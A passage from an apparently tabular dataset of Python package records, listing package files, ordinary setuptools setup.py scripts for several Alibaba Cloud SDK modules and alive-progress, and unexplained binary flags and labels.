odoe_example.py prettyplotting.py stability_of_qr_decomposition_for_low_rank_matrices.py conf.py datastructure_and_algorithms.py ampl_minimization_problem.py codon_model.py comparison_forward_reverse_mode.py comparison_to_complex_step_derivative_approximation.py covariance_matrix_computation.py error_propagation.py explicit_euler.py expm_accuracy.py expm_identities.py first_order_forward.py gauss_newton.py hessian_of_potential_function.py householder_qr.py if_then_else.py implicit_euler.py leastsquaresfitting.py logistic_regression.py matrixexponential.py minimal_surface.py himmelblau_minimization.py minhelper.py rosenbrock_banana.py wood_function_minimization.py moore_penrose_pseudoinverse.py neg_binom_regression.py polarization.py posterior_log_probability.py preferred_nucleotide.py series_expansion.py taylor_series_of_jacobian.py examples_tracer.py getting_started.py index.py runtime_comparison.py benchmark1.py prettyplotting.py run_benchmarks.py use_adolc.py use_algopy.py use_funcdesigner.py use_numdifftools.py use_scientific.py use_theano.py use_uncertainties.py symbolic_differentiation.py PKG-INFO run_tests.py sandbox.py setup.cfg setup.py,,1
alibabacloud_endpoint_util-0.0.3,0,1,1,1,1,0,1,0,client.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"""""""
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
     http://www.apache.org/licenses/LICENSE-2.0
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
""""""

import os
from setuptools import setup, find_packages

""""""
Setup module for alibabacloud_endpoint_util.
Created on 4/02/2020
@author: Alibaba Cloud
""""""

PACKAGE = ""alibabacloud_endpoint_util""
DESCRIPTION = ""The endpoint-util module of alibabaCloud Python SDK.""
AUTHOR = ""Alibaba Cloud""
AUTHOR_EMAIL = ""alibaba-cloud-sdk-dev-team@list.alibaba-inc.com""
URL = ""https://github.com/aliyun/endpoint-util/tree/master/python""
TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__

with open(""README.md"", encoding=""utf-8"") as fp:
    LONG_DESCRIPTION = fp.read()

setup_args = {
    'version': VERSION,
    'description': DESCRIPTION,
    'long_description': LONG_DESCRIPTION,
    'author': AUTHOR,
    'author_email': AUTHOR_EMAIL,
    'license': ""Apache License 2.0"",
    'url': URL,
    'keywords': [""alibabacloud"", ""sdk"", ""tea""],
    'packages': find_packages(exclude=[""tests*""]),
    'platforms': 'any',
    'install_requires': [""alibabacloud-tea>=0.0.1""],
    'classifiers': (
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development',
    )
}

setup(name='alibabacloud_endpoint_util', **setup_args)
",0
alibabacloud_openapi_util-0.1.6,0,1,1,1,1,0,1,0,client.py sm3.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"""""""
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
""""""

from setuptools import setup, find_packages
import os

""""""
setup module for alibabacloud_openapi_util.

Created on 28/05/2020

@author: Alibaba Cloud
""""""

PACKAGE = ""alibabacloud_openapi_util""
NAME = ""alibabacloud_openapi_util""
DESCRIPTION = ""Aliyun Tea OpenApi Library for Python""
AUTHOR = ""Alibaba Cloud""
AUTHOR_EMAIL = ""alibaba-cloud-sdk-dev-team@list.alibaba-inc.com""
URL = ""https://github.com/aliyun/darabonba-openapi-util""

TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__
REQUIRES = [""alibabacloud_tea_util>=0.0.2"", ""cryptography>=3.0.0""]

desc_file = open(""README.md"", encoding='utf-8')
try:
    LONG_DESCRIPTION = desc_file.read()
finally:
    desc_file.close()

setup(
    name=NAME,
    version=VERSION,
    description=DESCRIPTION,
    long_description=LONG_DESCRIPTION,
    author=AUTHOR,
    author_email=AUTHOR_EMAIL,
    license=""Apache License 2.0"",
    url=URL,
    keywords=[""alibabacloud_openapi_util""],
    packages=find_packages(exclude=[""tests*""]),
    include_package_data=True,
    platforms=""any"",
    install_requires=REQUIRES,
    classifiers=(
        ""Development Status :: 4 - Beta"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        ""Topic :: Software Development""
    )
)
",0
alibabacloud_openapi_util_py2-0.0.8,0,1,1,1,1,0,1,0,client.py sm3.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"""""""
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
""""""
import sys
from setuptools import setup, find_packages

""""""
setup module for alibabacloud_openapi_util.

Created on 30/12/2020

@author: Alibaba Cloud
""""""

PACKAGE = ""alibabacloud_openapi_util""
NAME = ""alibabacloud_openapi_util_py2""
DESCRIPTION = ""Aliyun Tea OpenApi Library for Python2""
AUTHOR = ""Alibaba Cloud""
AUTHOR_EMAIL = ""alibaba-cloud-sdk-dev-team@list.alibaba-inc.com""
URL = ""https://github.com/aliyun/darabonba-openapi-util""

VERSION = __import__(PACKAGE).__version__
REQUIRES = [""alibabacloud_tea_util_py2>=0.0.1"", ""cryptography>=2.6.0""]

if sys.version_info.major == 2:
    with open(""README.md"") as fp:
        LONG_DESCRIPTION = fp.read()
else:
    with open(""README.md"", encoding='utf-8') as fp:
        LONG_DESCRIPTION = fp.read()

setup(
    name=NAME,
    version=VERSION,
    description=DESCRIPTION,
    long_description=LONG_DESCRIPTION,
    author=AUTHOR,
    author_email=AUTHOR_EMAIL,
    license=""Apache License 2.0"",
    url=URL,
    keywords=[""alibabacloud_openapi_util""],
    packages=find_packages(exclude=[""tests*""]),
    include_package_data=True,
    platforms=""any"",
    install_requires=REQUIRES,
    classifiers=(
        ""Development Status :: 4 - Beta"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Topic :: Software Development""
    )
)
",0
alibabacloud_rpc_util-0.0.4,0,1,1,1,1,0,1,0,client.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"""""""
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
     http://www.apache.org/licenses/LICENSE-2.0
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
""""""

import os
from setuptools import setup, find_packages

""""""
Setup module for alibabacloud-rpc-util.
Created on 3/24/2020
@author: Alibaba Cloud
""""""

PACKAGE = ""alibabacloud_rpc_util""
DESCRIPTION = ""The rpc-util module of alibabaCloud Python SDK.""
AUTHOR = ""Alibaba Cloud""
AUTHOR_EMAIL = ""alibaba-cloud-sdk-dev-team@list.alibaba-inc.com""
URL = ""https://github.com/aliyun/alibabacloud-rpc-util-sdk/tree/master/python""
TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__

with open(""README.md"", encoding=""utf-8"") as fp:
    LONG_DESCRIPTION = fp.read()

setup_args = {
    'version': VERSION,
    'description': DESCRIPTION,
    'long_description': LONG_DESCRIPTION,
    'author': AUTHOR,
    'author_email': AUTHOR_EMAIL,
    'license': ""Apache License 2.0"",
    'url': URL,
    'keywords': [""alibabacloud"", ""sdk"", ""tea""],
    'packages': find_packages(exclude=[""tests*""]),
    'platforms': 'any',
    'install_requires': [""alibabacloud-tea>=0.0.1""],
    'classifiers': (
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development',
    )
}

setup(name='alibabacloud_rpc_util', **setup_args)
",0
alibabacloud_tea_openapi_py2-0.1.3,0,1,1,1,1,0,1,0,client.py models.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"# -*- coding: utf-8 -*-
""""""
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
""""""

import os
import sys
from setuptools import setup, find_packages

""""""
setup module for alibabacloud_tea_openapi_py2.

Created on 12/04/2022

@author: Alibaba Cloud SDK
""""""

PACKAGE = ""alibabacloud_tea_openapi""
NAME = ""alibabacloud_tea_openapi_py2"" or ""alibabacloud-package""
DESCRIPTION = ""Alibaba Cloud openapi SDK Library for Python2""
AUTHOR = ""Alibaba Cloud SDK""
AUTHOR_EMAIL = ""sdk-team@alibabacloud.com""
URL = ""https://github.com/aliyun/darabonba-openapi""
VERSION = __import__(PACKAGE).__version__
REQUIRES = [
    ""alibabacloud_tea_util_py2>=0.0.5, <1.0.0"",
    ""alibabacloud_credentials_py2>=0.0.1, <1.0.0"",
    ""alibabacloud_openapi_util_py2>=0.0.8, <1.0.0"",
    ""alibabacloud_gateway_spi_py2>=0.0.1, <1.0.0"",
    ""alibabacloud_tea_xml_py2>=0.0.2, <1.0.0""
]

LONG_DESCRIPTION = ''

if os.path.exists('./README.md'):
    if sys.version_info.major == 2:
        with open(""README.md"") as fp:
            LONG_DESCRIPTION = fp.read()
    else:
        with open(""README.md"", encoding=""utf-8"") as fp:
            LONG_DESCRIPTION = fp.read()

setup(
    name=NAME,
    version=VERSION,
    description=DESCRIPTION,
    long_description=LONG_DESCRIPTION,
    long_description_content_type='text/markdown',
    author=AUTHOR,
    author_email=AUTHOR_EMAIL,
    license=""Apache License 2.0"",
    url=URL,
    keywords=[""alibabacloud"",""tea"",""openapi"",""py2""],
    packages=find_packages(exclude=[""tests*""]),
    include_package_data=True,
    platforms=""any"",
    install_requires=REQUIRES,
    classifiers=(
        ""Development Status :: 4 - Beta"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Topic :: Software Development""
    )
)
",0
alibabacloud_tea_util_py2-0.0.6,0,1,1,1,1,0,1,0,client.py models.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"'
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
     http://www.apache.org/licenses/LICENSE-2.0
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
'''

import sys
from setuptools import setup, find_packages

""""""
Setup module for alibabacloud_tea_util.
Created on 3/18/2020
@author: Alibaba Cloud
""""""

PACKAGE = ""alibabacloud_tea_util""
DESCRIPTION = ""The tea-util module of alibabaCloud Python2 SDK.""
AUTHOR = ""Alibaba Cloud""
AUTHOR_EMAIL = ""alibaba-cloud-sdk-dev-team@list.alibaba-inc.com""
URL = ""https://github.com/aliyun/tea-util/tree/master/python2""

VERSION = __import__(PACKAGE).__version__

if sys.version_info.major == 2:
    with open(""README.md"") as fp:
        LONG_DESCRIPTION = fp.read()
else:
    with open(""README.md"", encoding='utf-8') as fp:
        LONG_DESCRIPTION = fp.read()

setup_args = {
    'version': VERSION,
    'description': DESCRIPTION,
    'long_description': LONG_DESCRIPTION,
    'author': AUTHOR,
    'author_email': AUTHOR_EMAIL,
    'license': ""Apache License 2.0"",
    'url': URL,
    'keywords': [""alibabacloud"", ""sdk"", ""tea""],
    'packages': find_packages(exclude=[""tests*""]),
    'platforms': 'any',
    'install_requires': ['alibabacloud-tea-py2'],
    'classifiers': (
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Topic :: Software Development',
    )
}

setup(name='alibabacloud_tea_util_py2', **setup_args)",0
alive-progress-2.4.1,1,1,1,1,1,0,1,0,bars.py spinners.py spinner_compiler.py utils.py __init__.py calibration.py configuration.py hook_manager.py progress.py __init__.py exhibit.py internal.py __init__.py demo.py repl.py sampling.py unicode_breaks.py utils.py __init__.py cells.py colors.py jupyter.py non_tty.py tty.py void.py __init__.py timing.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.md setup.cfg setup.py test_bars.py test_spinners.py test_utils.py __init__.py conftest.py test_calibration.py test_configuration.py test_hook_manager.py test_progress.py __init__.py test_cells.py test_timing.py __init__.py __init__.py,"from distutils.core import setup

from setuptools import find_packages

import alive_progress


def get_readme():
    with open('README.md', encoding='utf-8') as readme_file:
        return readme_file.read()


setup(
    name='alive-progress',
    version=alive_progress.__version__,
    description=alive_progress.__description__,
    long_description=get_readme(),
    long_description_content_type='text/markdown',
    url='https://github.com/rsalmei/alive-progress',
    author=alive_progress.__author__,
    author_email=alive_progress.__email__,
    license='MIT',
    classifiers=[
        # How mature is this project? Common values are
        #   3 - Alpha
        #   4 - Beta
        #   5 - Production/Stable
        'Development Status :: 5 - Production/Stable',

        # Indicate who your project is intended for
        'Intended Audience :: Developers',
        'Environment :: Console',
        'Natural Language :: English',

        # Pick your license as you wish (should match ""license"" above)
        'License :: OSI Approved :: MIT License',

        # Specify the Python versions you support here. In particular, ensure
        # that you indicate whether you support Python 2, Python 3 or both.
        # 'Programming Language :: Python :: 2',
        # 'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        # 'Programming Language :: Python :: 3.2',
        # 'Programming Language :: Python :: 3.3',
        # 'Programming Language :: Python :: 3.4',
        # 'Programming Language :: Python :: 3.5',
        # 'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
    ],
    keywords='progress bar progress-bar progressbar spinner eta monitoring python terminal '
             'multi-threaded REPL alive animated visual feedback simple live efficient'.split(),
    packages=find_packages(),
    data_files=[('', ['LICENSE'])],
    python_requires='>=3.7, <4',
    install_requires=['about_time==3.1.1', 'grapheme==0.6.0'],
)
",1
aliyun-python-sdk-alidns-2.6.32,0,1,1,1,0,0,0,0,endpoint.py AddCustomLineRequest.py AddDnsCacheDomainRequest.py AddDnsGtmAccessStrategyRequest.py AddDnsGtmAddressPoolRequest.py AddDnsGtmMonitorRequest.py AddDomainBackupRequest.py AddDomainGroupRequest.py AddDomainRecordRequest.py AddDomainRequest.py AddGtmAccessStrategyRequest.py AddGtmAddressPoolRequest.py AddGtmMonitorRequest.py AddGtmRecoveryPlanRequest.py BindInstanceDomainsRequest.py ChangeDomainGroupRequest.py ChangeDomainOfDnsProductRequest.py CopyGtmConfigRequest.py CreatePdnsAppKeyRequest.py CreatePdnsUdpIpSegmentRequest.py DeleteCustomLinesRequest.py DeleteDnsCacheDomainRequest.py DeleteDnsGtmAccessStrategyRequest.py DeleteDnsGtmAddressPoolRequest.py DeleteDomainGroupRequest.py DeleteDomainRecordRequest.py DeleteDomainRequest.py DeleteGtmAccessStrategyRequest.py DeleteGtmAddressPoolRequest.py DeleteGtmRecoveryPlanRequest.py DeleteSubDomainRecordsRequest.py DescribeBatchResultCountRequest.py DescribeBatchResultDetailRequest.py DescribeCustomLineRequest.py DescribeCustomLinesRequest.py DescribeDnsCacheDomainsRequest.py DescribeDnsGtmAccessStrategiesRequest.py DescribeDnsGtmAccessStrategyAvailableConfigRequest.py DescribeDnsGtmAccessStrategyRequest.py DescribeDnsGtmAddrAttributeInfoRequest.py DescribeDnsGtmAddressPoolAvailableConfigRequest.py DescribeDnsGtmAvailableAlertGroupRequest.py DescribeDnsGtmInstanceAddressPoolRequest.py DescribeDnsGtmInstanceAddressPoolsRequest.py DescribeDnsGtmInstanceRequest.py DescribeDnsGtmInstancesRequest.py DescribeDnsGtmInstanceStatusRequest.py DescribeDnsGtmInstanceSystemCnameRequest.py DescribeDnsGtmLogsRequest.py DescribeDnsGtmMonitorAvailableConfigRequest.py DescribeDnsGtmMonitorConfigRequest.py DescribeDnsProductInstanceRequest.py DescribeDnsProductInstancesRequest.py DescribeDNSSLBSubDomainsRequest.py DescribeDohAccountStatisticsRequest.py DescribeDohDomainStatisticsRequest.py DescribeDohDomainStatisticsSummaryRequest.py DescribeDohSubDomainStatisticsRequest.py DescribeDohSubDomainStatisticsSummaryRequest.py DescribeDohUserInfoRequest.py DescribeDomainDnssecInfoRequest.py DescribeDomainGroupsRequest.py DescribeDomainInfoRequest.py DescribeDomainLogsRequest.py DescribeDomainNsRequest.py DescribeDomainRecordInfoRequest.py DescribeDomainRecordsRequest.py DescribeDomainsRequest.py DescribeDomainStatisticsRequest.py DescribeDomainStatisticsSummaryRequest.py DescribeGtmAccessStrategiesRequest.py DescribeGtmAccessStrategyAvailableConfigRequest.py DescribeGtmAccessStrategyRequest.py DescribeGtmAvailableAlertGroupRequest.py DescribeGtmInstanceAddressPoolRequest.py DescribeGtmInstanceAddressPoolsRequest.py DescribeGtmInstanceRequest.py DescribeGtmInstancesRequest.py DescribeGtmInstanceStatusRequest.py DescribeGtmInstanceSystemCnameRequest.py DescribeGtmLogsRequest.py DescribeGtmMonitorAvailableConfigRequest.py DescribeGtmMonitorConfigRequest.py DescribeGtmRecoveryPlanAvailableConfigRequest.py DescribeGtmRecoveryPlanRequest.py DescribeGtmRecoveryPlansRequest.py DescribeInstanceDomainsRequest.py DescribePdnsAccountSummaryRequest.py DescribePdnsAppKeyRequest.py DescribePdnsAppKeysRequest.py DescribePdnsOperateLogsRequest.py DescribePdnsRequestStatisticRequest.py DescribePdnsRequestStatisticsRequest.py DescribePdnsThreatLogsRequest.py DescribePdnsThreatStatisticRequest.py DescribePdnsThreatStatisticsRequest.py DescribePdnsUdpIpSegmentsRequest.py DescribePdnsUserInfoRequest.py DescribeRecordLogsRequest.py DescribeRecordStatisticsRequest.py DescribeRecordStatisticsSummaryRequest.py DescribeSubDomainRecordsRequest.py DescribeSupportLinesRequest.py DescribeTagsRequest.py DescribeTransferDomainsRequest.py ExecuteGtmRecoveryPlanRequest.py GetMainDomainNameRequest.py GetTxtRecordForVerifyRequest.py ListTagResourcesRequest.py ModifyHichinaDomainDNSRequest.py MoveDomainResourceGroupRequest.py MoveGtmResourceGroupRequest.py OperateBatchDomainRequest.py PausePdnsServiceRequest.py PreviewGtmRecoveryPlanRequest.py RemovePdnsAppKeyRequest.py RemovePdnsUdpIpSegmentRequest.py ResumePdnsServiceRequest.py RetrieveDomainRequest.py RollbackGtmRecoveryPlanRequest.py SetDnsGtmAccessModeRequest.py SetDnsGtmMonitorStatusRequest.py SetDNSSLBStatusRequest.py SetDomainDnssecStatusRequest.py SetDomainRecordStatusRequest.py SetGtmAccessModeRequest.py SetGtmMonitorStatusRequest.py SwitchDnsGtmInstanceStrategyModeRequest.py TagResourcesRequest.py TransferDomainRequest.py UnbindInstanceDomainsRequest.py UntagResourcesRequest.py UpdateAppKeyStateRequest.py UpdateCustomLineRequest.py UpdateDnsCacheDomainRemarkRequest.py UpdateDnsCacheDomainRequest.py UpdateDnsGtmAccessStrategyRequest.py UpdateDnsGtmAddressPoolRequest.py UpdateDnsGtmInstanceGlobalConfigRequest.py UpdateDnsGtmMonitorRequest.py UpdateDNSSLBWeightRequest.py UpdateDomainGroupRequest.py UpdateDomainRecordRemarkRequest.py UpdateDomainRecordRequest.py UpdateDomainRemarkRequest.py UpdateGtmAccessStrategyRequest.py UpdateGtmAddressPoolRequest.py UpdateGtmInstanceGlobalConfigRequest.py UpdateGtmMonitorRequest.py UpdateGtmRecoveryPlanRequest.py ValidateDnsGtmCnameRrCanUseRequest.py ValidatePdnsUdpIpSegmentRequest.py __init__.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/python
'''
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
'''

from setuptools import setup, find_packages
import os
import sys

""""""
setup module for alidns.

Created on 7/3/2015

@author: alex
""""""

PACKAGE = ""aliyunsdkalidns""
NAME = ""aliyun-python-sdk-alidns""
DESCRIPTION = ""The alidns module of Aliyun Python sdk.""
AUTHOR = ""Aliyun""
AUTHOR_EMAIL = ""aliyun-developers-efficiency@list.alibaba-inc.com""
URL = ""http://develop.aliyun.com/sdk/python""

TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__

desc_file = open(""README.rst"")
try:
	LONG_DESCRIPTION = desc_file.read()
finally:
	desc_file.close()

setup(
    name=NAME,
    version=VERSION,
    description=DESCRIPTION,
    long_description=LONG_DESCRIPTION,
    author=AUTHOR,
    author_email=AUTHOR_EMAIL,
    license=""Apache"",
    url=URL,
    keywords=[""aliyun"",""sdk"",""alidns""],
    packages=find_packages(exclude=[""tests*""]),
    include_package_data=True,
    platforms=""any"",
    install_requires=[""aliyun-python-sdk-core>=2.11.5"",],
    classifiers=(
                ""Development Status :: 4 - Beta"",
                ""Intended Audience :: Developers"",
                ""License :: OSI Approved :: Apache Software License"",
                ""Programming Language :: Python"",
                ""Programming Language :: Python :: 2.6"",
                ""Programming Language :: Python :: 2.7"",
                ""Programming Language :: Python :: 3"",
                ""Programming Language :: Python :: 3.3"",
                ""Programming Language :: Python :: 3.4"",
                ""Programming Language :: Python :: 3.5"",
                ""Programming Language :: Python :: 3.6"",
                ""Topic :: Software Development"",
              )

)",0
aliyun-python-sdk-core-2.13.36,0,1,1,1,1,0,0,0,error_code.py error_msg.py error_type.py exceptions.py __init__.py sha_hmac1.py sha_hmac256.py __init__.py roa_signature_composer.py rpc_signature_composer.py __init__.py credentials.py access_key_signer.py ecs_ram_role_signer.py ram_role_arn_signer.py rsa_key_pair_signer.py signer.py signer_factory.py sts_token_signer.py __init__.py __init__.py __init__.py client.py compat.py endpoints.json retry_config.json timeout_config.json chained_endpoint_resolver.py default_endpoint_resolver.py endpoint_resolver_base.py endpoint_resolver_rules.py local_config_global_endpoint_resolver.py local_config_regional_endpoint_resolver.py DescribeEndpointsRequest.py __init__.py location_service_endpoint_resolver.py resolver_endpoint_request.py user_customized_endpoint_resolver.py __init__.py format_type.py http_request.py http_response.py method_type.py protocol_type.py __init__.py region_provider.py __init__.py request.py backoff_strategy.py retry_condition.py retry_policy.py retry_policy_context.py __init__.py parameter_helper.py validation.py __init__.py adapters.py api.py auth.py certs.py compat.py cookies.py exceptions.py help.py hooks.py models.py cacert.pem core.py __init__.py __main__.py big5freq.py big5prober.py chardistribution.py charsetgroupprober.py charsetprober.py chardetect.py __init__.py codingstatemachine.py compat.py cp949prober.py enums.py escprober.py escsm.py eucjpprober.py euckrfreq.py euckrprober.py euctwfreq.py euctwprober.py gb2312freq.py gb2312prober.py hebrewprober.py jisfreq.py jpcntx.py langbulgarianmodel.py langcyrillicmodel.py langgreekmodel.py langhebrewmodel.py langhungarianmodel.py langthaimodel.py langturkishmodel.py latin1prober.py mbcharsetprober.py mbcsgroupprober.py mbcssm.py sbcharsetprober.py sbcsgroupprober.py sjisprober.py universaldetector.py utf8prober.py version.py __init__.py connection.py connectionpool.py appengine.py ntlmpool.py pyopenssl.py securetransport.py socks.py _appengine_environ.py bindings.py low_level.py __init__.py __init__.py exceptions.py fields.py filepost.py makefile.py __init__.py ordered_dict.py six.py socks.py _implementation.py __init__.py __init__.py poolmanager.py request.py response.py connection.py queue.py request.py response.py retry.py selectors.py ssl_.py timeout.py url.py wait.py __init__.py _collections.py __init__.py __init__.py packages.py sessions.py status_codes.py structures.py utils.py _internal_utils.py __init__.py __version__.py six.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt ChangeLog.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/python
'''
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
'''

import os
import sys

from setuptools import setup, find_packages

""""""
Setup module for core.

Created on 6/24/2015

@author: Alibaba Cloud
""""""

PACKAGE = ""aliyunsdkcore""
DESCRIPTION = ""The core module of Aliyun Python SDK.""
AUTHOR = ""Alibaba Cloud""
AUTHOR_EMAIL = ""alibaba-cloud-sdk-dev-team@list.alibaba-inc.com""
URL = ""https://github.com/aliyun/aliyun-openapi-python-sdk""

TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__

with open(""README.rst"") as fp:
    LONG_DESCRIPTION = fp.read()

requires = [
    ""jmespath>=0.9.3,<1.0.0"",
    ""cryptography>=2.6.0""
]

setup_args = {
    'version': VERSION,
    'description': DESCRIPTION,
    'long_description': LONG_DESCRIPTION,
    'author': AUTHOR,
    'author_email': AUTHOR_EMAIL,
    'license': ""Apache License 2.0"",
    'url': URL,
    'keywords': [""aliyun"", ""sdk"", ""core""],
    'packages': find_packages(exclude=[""tests*""]),
    'package_data': {'aliyunsdkcore': ['data/*.json', '*.pem', ""vendored/*.pem""],
                     'aliyunsdkcore.vendored.requests.packages.certifi': ['cacert.pem']},
    'platforms': 'any',
    'install_requires': requires,
    'classifiers': (
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development',
    )
}

setup(name='aliyun-python-sdk-core', **setup_args)
",0
